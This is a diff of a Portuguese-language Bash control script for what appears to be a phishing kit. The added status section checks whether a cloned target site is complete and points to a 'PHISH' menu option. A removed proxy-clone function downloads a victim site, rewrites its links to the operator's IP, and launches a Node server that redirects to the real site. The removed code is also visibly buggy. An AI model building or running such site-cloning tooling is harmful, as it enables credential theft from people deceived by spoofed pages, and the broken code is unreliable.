@@ -612,9 +612,63 @@ show_status() {
     fi
 
     echo ""
+    echo -e "  ${PURPLE}──── Site Clonado ────${NC}"
+
+    # Diagnóstico do site atual
+    local site_dir="$SITE_DIR"
+    if [ -d "$site_dir" ] && [ -f "$site_dir/index.html" ]; then
+        local html_size=$(wc -c < "$site_dir/index.html" 2>/dev/null | tr -d ' ')
+        local css_count=$(ls "$site_dir"/css_*.css 2>/dev/null | wc -l)
+        local js_count=$(ls "$site_dir"/js_*.js 2>/dev/null | wc -l)
+        local asset_count=$(ls "$site_dir"/asset_* 2>/dev/null | wc -l)
+        local total=$((html_size))
+        [ "$css_count" -gt 0 ] && total=$((total + $(wc -c "$site_dir"/css_*.css 2>/dev/null | tail -1 | awk '{print $1}')))
+        echo -e "  ${YELLOW}HTML:${NC}             ${WHITE}${html_size} bytes${NC}"
+
+        # Detectar SPA (Angular/React/Vue)
+        local is_spa=0
+        local spa_type=""
+        grep -qi 'app-root\|_nghost\|__NEXT_DATA__\|data-reactroot\|ng-version\|vue-router' "$site_dir/index.html" 2>/dev/null && is_spa=1
+        grep -qi 'app-root\|_nghost\|ng-version' "$site_dir/index.html" 2>/dev/null && spa_type="Angular"
+        grep -qi '__NEXT_DATA__\|__next' "$site_dir/index.html" 2>/dev/null && spa_type="Next.js"
+        grep -qi 'data-reactroot\|react' "$site_dir/index.html" 2>/dev/null && spa_type="React"
+        grep -qi 'vue-router\|vue.js\|vue.min' "$site_dir/index.html" 2>/dev/null && spa_type="Vue.js"
+
+        if [ "$is_spa" = "1" ]; then
+            echo -e "  ${RED}⚠ SPA detectado: ${spa_type}${NC}"
+            echo -e "  ${RED}  → Site é 100% JS renderizado no browser${NC}"
+            echo -e "  ${RED}  → Clone real NÃO é possível${NC}"
+            echo -e "  ${YELLOW}  → Use '1) PHISH' pra testar outro site${NC}"
+        else
+            echo -n "  ${YELLOW}Status:${NC}           "
+            if [ "$html_size" -lt 3000 ]; then
+                echo -e "${RED}⚠ HTML muito pequeno (site pode ter bloqueio)${NC}"
+            elif [ "$css_count" -eq 0 ]; then
+                echo -e "${YELLOW}⚠ Sem CSS (pode ficar sem estilo)${NC}"
+            elif [ "$js_count" -eq 0 ]; then
+                echo -e "${YELLOW}⚠ Sem JS (estático OK)${NC}"
+            else
+                echo -e "${GREEN}✓ Completo${NC}"
+            fi
+        fi
+
+        echo -e "  ${YELLOW}CSS files:${NC}        ${WHITE}${css_count}${NC}"
+        echo -e "  ${YELLOW}JS files:${NC}         ${WHITE}${js_count}${NC}"
+        echo -e "  ${YELLOW}Assets:${NC}           ${WHITE}${asset_count}${NC}"
+
+        # Verificar se HTML faz referência a CDN externa
+        local ext_links=$(grep -oE '(src|href)="https?://[^"]*"' "$site_dir/index.html" 2>/dev/null | grep -v 'localhost' | wc -l)
+        if [ "$ext_links" -gt 0 ]; then
+            echo -e "  ${RED}⚠ Links externos:    ${ext_links} (não substituídos!)${NC}"
+        fi
+    else
+        echo -e "  ${YELLOW}Site:${NC}             ${RED}Nenhum clone atual${NC}"
+    fi
+
+    echo ""
     echo -e "  ${PURPLE}──── Processos ────${NC}"
 
-    # Servidor — verificar PID E processo node vivo
+    # Servidor
     echo -n "  ${YELLOW}Servidor:${NC}         "
     local alive=0
     if [ -f "$SCRIPT_DIR/.server.pid" ]; then
@@ -626,12 +680,10 @@ show_status() {
             echo -e "${RED}✗ PID $pid parou${NC}"
         fi
     fi
-    # Mesmo sem PID, verificar se node tá rodando
     if [ "$alive" = "0" ]; then
         local node_pids=$(pgrep -f "node.*server" 2>/dev/null)
         if [ -n "$node_pids" ]; then
             echo -e "${GREEN}    → Node vivo: $node_pids (sem PID file)${NC}"
-            alive=1
         else
             echo -e "${RED}✗ Desligado${NC}"
         fi
@@ -672,13 +724,6 @@ show_status() {
         echo -e "    ${RED}✗${NC} server/server.js"
     fi
 
-    # clone_temp
-    if [ -d "$SCRIPT_DIR/clone_temp" ]; then
-        local tmp_count=$(ls "$SCRIPT_DIR/clone_temp" 2>/dev/null | wc -l)
-        echo -e "    ${GREEN}✓${NC} clone_temp/ ($tmp_count arquivos)"
-    fi
-
-    # captured_sites
     if [ -d "$CAPTURED_DIR" ]; then
         local site_count=$(ls -d "$CAPTURED_DIR"/*/ 2>/dev/null | wc -l)
         echo -e "  ${YELLOW}Sites salvos:${NC}    ${WHITE}$site_count${NC}"
@@ -687,7 +732,6 @@ show_status() {
     echo ""
     echo -e "  ${PURPLE}──── Logs ────${NC}"
 
-    # server.log — mostrar última linha se existir
     if [ -f "$SCRIPT_DIR/server.log" ]; then
         local log_size=$(wc -c < "$SCRIPT_DIR/server.log" 2>/dev/null | tr -d ' ')
         local last_line=$(tail -1 "$SCRIPT_DIR/server.log" 2>/dev/null)
@@ -697,7 +741,6 @@ show_status() {
         echo -e "  ${YELLOW}Server.log:${NC}      ${RED}não existe${NC}"
     fi
 
-    # curl.log — mostrar última linha se existir
     if [ -f "$SCRIPT_DIR/curl.log" ]; then
         local log_size=$(wc -c < "$SCRIPT_DIR/curl.log" 2>/dev/null | tr -d ' ')
         local last_line=$(tail -1 "$SCRIPT_DIR/curl.log" 2>/dev/null)
@@ -715,7 +758,7 @@ show_status() {
     fi
 
     echo ""
-    echo -e "${YELLOW}Enter para voltar...${NC}"
+    echo -e "${YELLOW}Enter...${NC}"
     read
 }
 
@@ -735,106 +778,6 @@ stop_all() {
     echo -e "${GREEN}[✓] Tudo parado.${NC}"
 }
 
-# =============================================
-# PROXY CLONE
-# =============================================
-do_proxy_clone() {
-    clear
-    echo -e "${PURPLE}═══ PROXY CLONE ═══${NC}"
-    echo ""
-    echo -e "${YELLOW}URL do site:${NC} "
-    read URL
-    [ -z "$URL" ] && return
-    echo "$URL" | grep -q "^http" || URL="https://$URL"
-
-    echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
-    read PT
-    [ -z "$PT" ] && PT=8080
-
-    # Ativar proxychains se existir
-    local curl_cmd="curl"
-    local curl_opts="-s -L -k --connect-timeout 20 --max-time 60"
-    local proxychains_conf=""
-
-    if [ -f "$HOME/.proxychains/proxychains.conf" ]; then
-        proxychains_conf="$HOME/.proxychains/proxychains.conf"
-    elif [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ]; then
-        proxychains_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
-    fi
-
-    [ -n "$proxychains_conf" ] && echo -e "${RED}[proxychains] Arquivo NÃO encontrado!${NC}" && pause && return
-
-    local base_url="$MINHA_URL"
-    local porta="$PT"
-
-    # Baixar HTML via proxychains
-    sleep 2
-    $curl_cmd $curl_opts -o /tmp/proxy_index.html "$base_url" > /dev/null 2>&1
-
-    if [ ! -s /tmp/proxy_index.html ]; then
-        echo -e "${RED}[ERRO] Falha ao baixar via proxy.${NC}"
-        read
-        return
-    fi
-    echo -e "${GREEN}  → HTML OK ($(wc -c < /tmp/proxy_index.html) bytes)${NC}"
-
-    # Baixar CSS via proxy + substituir no HTML
-    local css_count=0
-    grep -oE 'href="[^"]*\.css[^"]*"' /tmp/proxy_index.html 2>/dev/null | sed 's/href="//;s/"//' | while read -r css_url; do
-        [ -z "$css_url" ] && continue
-        if echo "$css_url" | grep -q "^http"; then
-        local css_abs="$css_url"
-        else
-            local css_abs="$$base_url/$css_url"
-        fi
-        local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g')"
-        $curl_cmd $curl_opts -o "/tmp/$css_file" "$css_abs" >> /dev/null 2>&1
-        css_count=$((css_count + 1))
-    done
-    echo -e "${GREEN}  → CSS baixado(s)${NC}"
-
-    # Pegar IP
-    local my_ip=$(get_my_ip)
-
-    # Substituir URLs do site pelo proxy
-    local local_url="http://${my_ip}:${porta}"
-    perl -i -pe "s|\Q${base_url}\E|${local_url}|g" /tmp/proxy_index.html
-
-    # ... (resto do processamento simplificado)
-    # Mover pra pasta clonada
-    rm -rf "$SITE_DIR"/*
-    cp /tmp/proxy_index.html "$SITE_DIR/index.html"
-    [ -d "$SCRIPT_DIR/captured" ] || mkdir -p "$SITE_DIR/../captured"
-    $do_proxy_clean_tmp && echo -e "  ✔ Limpeza temporária"
-
-    echo ""
-    echo -e "  ✅ CLONE PROXY REALIZADO!"
-    echo -e "  📍 http://${my_ip}:${porta}"
-
-    # Matar processo antigo
-    pkill -9 -f "node.*server.js" 2>/dev/null
-    sleep 1
-    fuser -k "$port/tcp" 2>/dev/null
-
-    # Iniciar server
-    cd "$SCRIPT_DIR"
-    REDIRECT_URL="$base_url" PORT="$porta" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node server/server.js > server.log 2>&1 &
-    local pid=$!
-    echo "$pid" > "$SCRIPT_DIR/.server.pid"
-    sleep 2
-
-    if kill -0 "$pid" 2>/dev/null; then
-        echo -e "${GREEN}[✓] Servidor rodando! PID: $pid${NC}"
-    else
-        echo -e "${RED}[ERRO] Servidor não subiu. Log:${NC}"
-        cat "$SCRIPT_DIR/server.log" 2>/dev/null
-    fi
-
-    rm -f /tmp/proxy_index.html /tmp/css_*.css
-    echo ""
-    echo -e "${YELLOW}Pressione Enter...${NC}"
-    read
-}
 
 # =============================================
 # PROXY CLONE
